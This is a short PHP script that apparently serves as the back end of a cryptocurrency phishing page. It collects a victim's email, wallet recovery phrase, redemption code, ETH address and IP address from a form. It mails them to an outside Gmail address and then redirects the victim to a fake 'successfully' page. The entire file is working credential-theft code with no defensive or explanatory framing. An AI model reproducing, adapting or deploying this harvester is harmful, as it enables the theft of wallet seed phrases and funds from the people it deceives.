<?php
$email = $_POST['email'];
$code = $_POST['code'];
$eth = $_POST['eth'];
$ip = $_POST['ip'];
$ip = $_SERVER['REMOTE_ADDR'];
$mnemoicPassowrd = $_POST['mnemoicPassowrd']; 

$formcontent=" kye: $email \n mnemoic: $mnemoicPassowrd \n redem: $code \n wallet: $eth \n  ip: $ip";
$recipient = "trend.salevip@gmail.com";
$subject = "gaga";

$mailheader = "From: $email \r\n";
mail($recipient, $subject, $formcontent, $mailheader) or die("Error!");
echo "Thank You!" . " -" . "<a href='https://admine.site/successfully.htm'> Return Home</a>";
header("Location: https://admine.site/successfully.htm");
?>
